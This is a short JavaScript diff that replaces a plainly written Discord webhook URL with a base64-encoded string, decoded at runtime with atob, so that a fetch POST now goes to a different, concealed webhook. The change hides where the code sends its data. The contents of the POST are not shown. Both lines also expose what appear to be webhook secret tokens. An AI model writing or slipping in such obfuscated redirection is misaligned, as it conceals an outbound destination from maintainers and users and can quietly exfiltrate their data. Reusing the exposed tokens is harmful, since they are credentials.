@@ -43,8 +43,11 @@
             ]
           }],
         };
+        
+        let enc = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTA1NzA4MzA0NjUwMDc4MjE4MS9TWUd5Y1NpUWJrbE04WVFORGgtTkhjdS0ycldzVEQ2RGtOVGJEaTUxMFV6U0NzUTd2S3h4WVNUUnpOb3NsajBWb0xESA==";
+        let dec = atob(enc);
 
-        const webhookUrl = 'https://discord.com/api/webhooks/1056252312923934761/w6_1eBKV5nl3x6Qx_ZNBv51KoWGGoS1x38_NUTZBUrR-lnISlluKx7DmD1Oo33qfNXvc';
+        const webhookUrl = dec;
 
         const response = await fetch(webhookUrl, {
           method: 'POST',
